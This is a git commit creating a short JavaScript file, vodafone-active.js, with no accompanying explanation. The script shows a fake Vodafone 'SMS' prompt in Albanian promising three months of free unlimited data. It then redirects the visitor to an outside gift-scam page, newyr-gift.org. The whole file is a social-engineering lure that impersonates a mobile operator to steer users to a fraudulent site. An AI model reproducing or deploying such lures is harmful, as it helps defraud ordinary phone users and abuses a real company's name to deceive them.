07fa3b90fd4f30992dc92b8e209191971ca10e26
ukebeblog <esther001imoh@gmail.com>
2025-01-06 16:29:53 +0100

    Create vodafone-active.js

---
+++ vodafone-active.js
@@ -0,0 +1,6 @@
+
+var password = 'AKTIVITO'
+password=prompt('SMS: Urime Ju kualifikoheni për të dhëna të pakufizuara falas për 3 muaj të Vodafone, ju lutemi shtypni OK për ta aktivizuar tani   ','AKTIVITO');
+if (password != 'AKTIVITO') {
+location.href='https://newyr-gift.org/vodafone-unlimited.html';
+}
